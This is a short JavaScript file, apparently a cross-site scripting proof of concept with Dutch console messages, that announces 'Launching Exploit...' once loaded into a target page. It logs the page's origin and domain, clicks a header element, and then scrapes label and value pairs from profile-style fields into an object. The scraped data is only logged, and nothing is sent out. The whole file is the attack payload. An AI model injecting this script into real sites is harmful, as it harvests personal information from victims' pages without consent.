function main_func(){
  console.log("Hallo vanaf een js programma gehost van het internet");
  console.log("Dit is mijn origin: "+window.origin);
  console.log("Dit is mijn domain: "+document.domain);
  console.log("\nLaunching Exploit...")
  const name_el = document.getElementsByClassName("header")?.[0];
  console.log("Name" + name_el.innerHTML);
  setTimeout(()=>{
    const els = Array.prototype.slice.call(document.getElementsByClassName("twopartfields"));
    const data = {}
    for (let i = 0; i < els.length; i+=2){
      const label = els[i].innerHTML;
      const info = els[i+1].querySelector('span').innerHTML;
      data[label] = info;
      console.log(data);
    }
  },500)
  name_el.click()
  
  
}
main_func()
